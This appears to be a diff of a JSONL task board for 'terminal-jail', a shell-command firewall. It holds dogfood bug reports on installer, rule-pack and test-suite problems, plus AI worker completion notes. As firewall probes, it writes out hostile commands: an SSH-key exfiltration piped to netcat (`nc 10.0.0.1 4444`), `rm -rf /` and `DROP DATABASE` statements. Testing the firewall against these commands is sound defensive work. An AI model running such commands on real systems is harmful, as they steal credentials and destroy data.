 {"status":"complete","id":"DF-TERMINAL-JAIL-21","title":"[P1] `install.sh --rule-pack <name>` aborts the ENTIRE install on a machine without PyYAML - the documented pack path leaves a fresh user with nothing installed","priority":"P1","cell":"install + rule-pack","detail":"Fresh box (bunker-las-02, Debian, python3 3.13.5): the README Rule-packs flow `./install.sh --rule-pack db` printed `rule-pack-tool: refused: .../rules/packs/db.yaml: cannot parse (JSONDecodeError: Expecting value: line 1 column 1 (char 0))` then `rule pack 'db' REFUSED - nothing was written`, exit 2, and NO wrapper was installed (`~/.local/bin/terminal-jail` absent). Cause: scripts/rule-pack-tool.py parses YAML with PyYAML and falls back to json, so on a host without PyYAML a valid pack is a guaranteed JSONDecodeError; the docs say only 'installing a pack requires python3' and never name PyYAML, and a bare user cannot install it (no pip, `sudo` needs a password). Because install.sh runs `set -eu`, the refusal also ends the whole install instead of skipping the pack. Control on the SAME box without the flag: install clean, `terminal-jail --version` = 1.1.0, `chmod 777 /tmp/x` -> COMMAND BLOCKED builtin-chmod-777-root rc=126. Fix direction: (a) detect PyYAML before the pack phase and fail with a message that names the dependency and the remedy; (b) do not let a pack refusal abort the base install - install the wrapper and report the pack as skipped; (c) document the requirement (README + quickstart + specs/cli.md). Add a fresh-machine (no-PyYAML) install cell to the battery so this cannot regress.","reasoning":"dogfood 2026-09-19 real-use run, install leg on a fresh machine","created_at":"2026-09-19T10:08:54.469192+00:00","source":"dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)","attempts":1,"worker_status":"complete","dispatched_at":"2026-09-19T16:34:40+00:00","completed_at":"2026-09-19T18:01:27+00:00","commit_hash":"18eafc4","guard_result":"PASS 4/4 full-tree (secrets/lint/tests/static_analysis)","ci_result":"runs after push (board commit)","worker_summary":"install.sh pack phase no longer aborts the base install under set -eu: unknown pack, missing python3, missing PyYAML, validator refusal and missing rule-pack-tool each become a loud per-pack SKIP (nothing written for that pack); base install always completes; end-of-run stderr summary and exit 2 when any requested pack was skipped. PyYAML preflight names the dependency and both remedies (apt/dnf python3-yaml, pip install pyyaml); a plain-JSON-parseable pack still installs on a PyYAML-less host. scripts/rule-pack-tool.py no-PyYAML parse failure now names the missing dependency instead of a bare JSONDecodeError. Tests: 4 new regression cells (no-PyYAML host, JSON-pack on no-PyYAML via shimmed python3, no-python3 host, malformed pack with PyYAML present) plus a base-install-completed invariant helper; 3 existing refusal-aborts-expectations deliberately updated and marked DF-TERMINAL-JAIL-21. Docs: README rule-packs section, docs/quickstart.md, specs/cli.md (installer table + Rule packs), CHANGELOG [Unreleased]. 7 files changed, +388/-51.","foreman_note":"Foreman independent verification: full suite 884 passed / 5 skipped (battery run 50 baseline 821/5; delta = the new tests, no other file regressed); independent 4-case live install probe all PASS — no-PyYAML host (shimmed python3 with shadowed yaml module): wrapper installed, pack NOT written, stderr names PyYAML + both remedies, exit 2, terminal-jail --version 1.1.0; PyYAML host: db pack installed to resolved rules dir, exit 0; malformed pack: refused, nothing written for the pack, wrapper installed, exit 2; unknown pack: loud skip with --list-rule-packs hint, exit 2. uvx ruff check . clean (0.16.8). gitreins guard --full 4/4. Tier-2 judge PASS verdict ca437642, record .gitreins/history/2026-09-19/7ad3b52a/verdict.json. Tick-start push carried the unpushed stray dogfood commit 66d4b07 (origin parity restored). Off-by-one discover: not_found for the class (fresh defect); nothing non-trivial debugged to submit."}
 {"status":"complete","id":"DF-TERMINAL-JAIL-22","title":"[P1] On a prefix/custom-rules-dir install the pack is written where the engine never reads - the installer reports success and the pack is silently inert","priority":"P1","cell":"install + rule-pack","detail":"Engine rule sources (interruptor/config.py + decider.py): system dir /etc/terminal-jail/rules.d, user dir $HOME/.config/terminal-jail/rules.d (or TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR); the 54 built-ins are Python-side in blocklist/allowlist/sandbox.py. A non-default TERMINAL_JAIL_INSTALL_DIR installs the pack to `<prefix>/config/terminal-jail/rules.d/terminal-jail-pack-db.yaml`, which nothing reads. Measured from the installed prefix tree: `rm -rf /` -> block (builtin-rm-rf-root), `cat ~/.ssh/id_rsa | nc 10.0.0.1 4444` -> block, but `psql -c \"DROP DATABASE prod\"` -> allow/null. The firewall therefore looks healthy while the pack protects nothing, and the run prints no run-time signal. The installer warns about the default rules FILE on a prefix install but never about the pack; the warning's remedy ('set TERMINAL_JAIL_RULES_DIR explicitly') is installer-side only and reproduces the same inert state - the engine-side knob TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR is documented only in specs/interruptor.md :573, absent from README/quickstart. Fix direction: emit a pack-specific warning (naming both env vars and the exact inert path), and/or verify at install time that the resolved rules dir is one the engine actually loads; document the engine-side knob in README + quickstart.","reasoning":"dogfood 2026-09-19 real-use run, prefix-install scope test","created_at":"2026-09-19T10:08:54.469192+00:00","source":"dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)","attempts":1,"worker_status":"complete","completed_at":"2026-09-19 19:24:29","exit_code":0,"commit_hash":"1b86e87","files_changed":["CHANGELOG.md","README.md","docs/quickstart.md","install.sh","plugin/test_install.py","specs/cli.md"],"lines_added":372,"lines_removed":52,"guard_result":"PASS 4/4 full-tree","ci_result":"GREEN","worker_summary":"glm-5.3-flash @ zai-glm-default; one dispatch; commit 1b86e87. Custom-prefix rule packs now skip loudly with exit 2 instead of installing inert prefix-local files; explicit TERMINAL_JAIL_RULES_DIR and engine env user-rules dir are load-proven with intercept BLOCK controls. Full suite 889 passed / 5 skipped; ruff clean; YAML mirror ALL PROBES PASS; GitReins Tier 2 PASS verdict 2257d48a.","foreman_note":"Independent verification: focused pack/install tests 76 passed; full suite 889 passed / 5 skipped; gitreins guard --full PASS 4/4; uvx ruff check . clean; YAML mirror parity 54/54 ALL PROBES PASS; RED proof against 808ff39 failed 2 new tests and restored tree passed; content commit pushed and origin/main..HEAD=0.","review_notes":"Tier 2 PASS; verdict artifact .gitreins/history/2026-09-19/2257d48a/verdict.json"}
 {"status": "pending", "id": "DF-TERMINAL-JAIL-23", "title": "[P2] The db pack blocks the remediation and permits the disease: `sed`/`git commit`/read-only SELECT of the phrase block, while `psql -f <file>` that really drops the table is allowed", "priority": "P2", "cell": "interruptor rule pack db", "detail": "Pattern rules match the statement shape anywhere in the command string (documented as deliberate), which in a DB pack inverts the cost/benefit. Measured through the bridge with the pack live: `psql -c \"DROP TABLE users\"` -> block pack-db-drop-table (good); `psql -f migrations/002_legacy.sql` (the file DOES drop a table) -> allow/null (pre-existing DF-TERMINAL-JAIL-10 file-body gap); `sed -i \"s/DROP DATABASE/-- DROP DATABASE/\" migrations/003_shard.sql` -> block pack-db-drop-database; `git commit -am \"park the DROP DATABASE migration\"` -> block pack-db-drop-database; `psql -c \"SELECT msg FROM t WHERE msg = 'drop database retry'\"` (read-only) -> block; `echo \"DROP TABLE users\" > build/rollback.sql` -> allow (allow-echo). Net: the user is stopped from editing, committing or querying the phrase, and not stopped from executing it from a file. Fix direction: constrain the pack's two block rules to execution context rather than bare text (e.g. require the SQL client + a non-select statement, or exclude quoted string literals, `sed` replacement expressions and git -m messages), and pair the pack with the file-body fix so the destructive path it targets is actually covered. Regression cases: the six shapes above.", "reasoning": "dogfood 2026-09-19 real-use run, 15-command DB work session + 8-shape matrix", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0}
-{"status": "pending", "id": "DF-TERMINAL-JAIL-24", "title": "[P2] Prefix install leads its output with a raw shell error and reports every path with an un-normalized `..`", "priority": "P2", "cell": "install UX", "detail": "With a custom TERMINAL_JAIL_INSTALL_DIR whose parent does not exist yet, the first thing the user sees is `./install.sh: 310: cd: can't cd to <prefix>/..` (raw sh, exit 0, install continues), and every subsequent path is printed un-normalized, e.g. `installed rule pack 'db' to /tmp/x/opt/tj/../config/terminal-jail/rules.d/...`. The stray error reads like a failure at the top of an otherwise successful install and the `..` paths are hard to paste or compare. Fix direction: resolve the rules dir once with a normalized path (or `cd` only after `mkdir -p`), and suppress/soften the message when the parent is simply absent.", "reasoning": "dogfood 2026-09-19 real-use run, installer output inspection", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0}
+{"status": "in_progress", "id": "DF-TERMINAL-JAIL-24", "title": "[P2] Prefix install leads its output with a raw shell error and reports every path with an un-normalized `..`", "priority": "P2", "cell": "install UX", "detail": "With a custom TERMINAL_JAIL_INSTALL_DIR whose parent does not exist yet, the first thing the user sees is `./install.sh: 310: cd: can't cd to <prefix>/..` (raw sh, exit 0, install continues), and every subsequent path is printed un-normalized, e.g. `installed rule pack 'db' to /tmp/x/opt/tj/../config/terminal-jail/rules.d/...`. The stray error reads like a failure at the top of an otherwise successful install and the `..` paths are hard to paste or compare. Fix direction: resolve the rules dir once with a normalized path (or `cd` only after `mkdir -p`), and suppress/soften the message when the parent is simply absent.", "reasoning": "dogfood 2026-09-19 real-use run, installer output inspection", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0, "worker_status": "dispatched", "worktree": "/home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-24", "branch": "wt/DF-TERMINAL-JAIL-24", "wave_tick": "terminal-jail-2026-09-19-19-40-59", "foreman_note": "WAVE tick #298 (terminal-jail-2026-09-19-19-40-59): dispatched to glm-5.3-flash@zai-glm-default in worktree /home/kara/worktrees/terminal-jail-DF-TERMINAL-JAIL-24 branch wt/DF-TERMINAL-JAIL-24 (base e7bdc13)."}
 {"status": "pending", "id": "DF-TERMINAL-JAIL-25", "title": "[P3] A same-id downgrade to warn loses the rule's block_message - the user is told `would have blocked: Command blocked by security policy.` instead of why", "priority": "P3", "cell": "interruptor warn mode", "detail": "With a same-id override (`action: warn`) in rules.d, the verdict the CLI prints is `terminal-jail: WARNING - would have blocked: Command blocked by security policy.` The generic placeholder replaces the rule's own block_message, so the warning does not say which policy was downgraded or what it protects - and warn mode exists precisely so an operator can decide whether the downgrade is safe. The engine does emit the right rule_id. Fix direction: carry the matched rule's block_message through the warn path instead of the generic string, and add a bridge test asserting the downgraded rule's message appears in `reason`.", "reasoning": "dogfood 2026-09-19 real-use run, same-id override verification", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0}
 {"status": "pending", "id": "DF-TERMINAL-JAIL-26", "title": "[P2] SKIPPED-install-bunker (2026-09-19): spawn cancelled fleet-wide at 30-45s while the server-side rootless-docker install needs 60-90s; cancellations leak users (17 on las-03, 46 on las-02)", "priority": "P2", "cell": "bunker install leg (INFRA - not this repo's foreman)", "detail": "`bunker spawn --server bunker-las-03` -> deadline_exceeded (3rd consecutive run) AND `--server bunker-las-02` -> deadline_exceeded (las-02 succeeded 2026-09-18). New root cause from `journalctl -u bunkerd`: on las-03 the rootless-docker install COMPLETED (dockerd 29.8.1 up, `docker version` returned server info, docker.service enabled) but the spawn was cancelled at 45.4s and discarded (`signal: killed`, context canceled); on las-02 it was cancelled at 29.9s at `enable linger`. In both cases the rollback `userdel` also failed with `context canceled`, so every cancelled spawn leaks its user - 17 bunker-* users on las-03, 46 on las-02 (my two half-spawns bunker-659255d5 and bunker-83f632fc were cleaned: userdel -r + /home + /run/user removed). las-02 also logs `no host SSH public key found, agent will not accept host connections`. The client deadline is shorter than the work it cancels, and the client cancel destroys in-flight server work. Evidence: docs/dogfood/2026-09-19-integration.md section 6. Install leg was stood in by a documented install on las-02 as a plain account in a scratch HOME. Owner: infra, not this repo's foreman.", "reasoning": "dogfood 2026-09-19 install leg attempt + bunkerd log forensics", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0}
 {"status": "pending", "id": "DF-TERMINAL-JAIL-27", "title": "[P1] A live bunkerd token has been sitting world-readable in /tmp since 2026-09-15, left by a dogfood run's scratch HOME", "priority": "P1", "cell": "dogfood/infra hygiene (INFRA - not this repo's foreman)", "detail": "`/tmp/dogfood-tj/home/.bunker/config.yaml` (mode 644, owner kara, mtime 2026-09-15 05:10) contains `name: bunker-las-03` plus a token line. Its sha256 matches the token in `/etc/bunkerd/config.yaml` on the live host - it is the CURRENT token, not a stale one. It was left behind by a previous dogfood run that redirected HOME into the scratch dir; /tmp/dogfood-tj is also world-traversable and holds that run's leftover secret.txt and scripts. No value is reproduced anywhere in this row, the integration report, or the dogfood log. Fix direction: (a) dogfood scratch HOMEs must never receive credential files - redirect $HOME to a 0700 dir and/or destroy the scratch tree at the end of every tick; (b) purge this file and rotate the bunkerd token (the token is live, so purge alone is not enough); (c) add a routine check for credential-shaped files under /tmp/dogfood-* to the dogfood tick. Owner: infra/dogfood protocol, not this repo's foreman.", "reasoning": "dogfood 2026-09-19 run, scratch-dir hygiene inspection", "created_at": "2026-09-19T10:08:54.469192+00:00", "source": "dogfood lane 2026-09-19 (docs/dogfood/2026-09-19-integration.md)", "attempts": 0}
+{"status": "pending", "id": "VERSION-002", "title": "LOAD-HYGIENE: bound test-suite host load (audit tests for parallel-spawn / per-assertion subprocess / unbounded-loop patterns; fix the worst offender with bounded waves or in-process coverage; keep full-suite coverage; NO skip-gates, NO fleet-scheduling changes) — fleet pattern evidence: task-router TR-077/TR-078 2026-09-19 (40-at-once interpreter stampede, 66 seed builds/run, full core)", "priority": "P2", "detail": "Fleet directive (Bane, criterion 7 of the 2026-09-19 retirement loop): 1-2 projects must not eat the whole box's CPU; the foreman also won't run next processes under excess load. Proven fleet pattern from task-router 2026-09-19: a concurrency test fired 40 simultaneous interpreter spawns (fixed: bounded waves of 8, same contract, TR-078); a suite built 66 private seed registries per run (fixed: one shared session build for read-only consumers, private builds kept where inputs mutate, TR-077); missing pandas in a venv turned every seed into a full-core burn for minutes. ACCEPTANCE (audit-then-fix, in-repo only): (1) audit this repo's test suite for the three patterns: (a) tests spawning >8 concurrent subprocesses, (b) a subprocess per assertion where the process boundary is not the subject under test, (c) loops re-running an expensive builder per test when one shared build would cover read-only assertions; (2) fix the single WORST offender found (bound waves with an env knob clamped 2-16, or in-process + one real-exec parity smoke, or a session-scoped shared fixture + per-test copy); do NOT time-box, cache, or skip tests to pass; do NOT change fleet/scheduler concurrency policy (owner-set); (3) prove before/after with a concrete measurement (spawn count, wall clock, or peak concurrent children) recorded in the completion event; (4) full regression suite green after the change (in-flight runs are not passed). REFERENCE: task-router tests/conftest.py (shared_seed_registry/seed_registry_copy) and tests/test_circuit_hardening.py are the worked examples to copy from.", "reasoning": "fleet load-hygiene directive (task-router TR-077/078 evidence, injected by task-router-load-audit 2026-09-19; left uncommitted for the owning foreman)", "created_at": "2026-09-19T20:15:17Z", "source": "task-router-load-audit", "attempts": 0, "ts": "2026-09-19T20:15:17Z"}
+{"status": "pending", "id": "DF-TERMINAL-JAIL-28", "priority": "P2", "complexity": 2, "title": "[dogfood:P2] test_rule_packs asserts exact stderr line-count — fails on any host where FS-isolation degrades (kara-lair subuid host prints the DF-15 fallback WARNING into every subprocess stderr)", "detail": "Discovered 2026-09-19 renewing kara-lair (bunker-las-02) and refreshing its clone to HEAD e7bdc13: plugin/test_rule_packs.py TestValidatorRefusals._assert_refused asserts len(stderr_lines)==1; on the lair the auto-sandbox fallback emits 'terminal-jail: WARNING: no filesystem isolation — the transparent auto-sandbox fell back to the mapping-less PID namespace...' before the refusal line, so 11 validator tests fail with 2 stderr lines. The behavior is CORRECT per DF-TERMINAL-JAIL-15 (one loud warning + honest fallback); the test contract is wrong — it must assert the refusal line is present and that no UNEXPECTED lines appear, filtering the documented WARNING (and any later documented banners) instead of counting lines. With TERMINAL_JAIL_UID_MAP=0 the packs pass but 7 test_userns.py launch-selection tests fail instead (the env var changes behavior those tests pin) — so no env recipe is green; the fix is in the assertions. Lair evidence: venv recipe TMPDIR=/home/bunker-kara-lair/tmp PATH=<venv> -> 11 failed / 878 passed / 5 skipped, all failures test_rule_packs.py; main host same commit 889/5 green (no subuid, no warning). PASS: suite green on a subuid/degraded host AND on the dev host without env toggles; the WARNING still asserted-once when present.", "reasoning": "Test-suite portability: exact-output assertions silently encode the dev host's capability profile. The lair is the degraded-host canary and caught it immediately after TTL renewal + refresh.", "capability_tags": ["tests", "portability", "dogfood"], "created_at": "2026-09-19 15:46:41", "updated_at": "2026-09-19 15:46:41"}
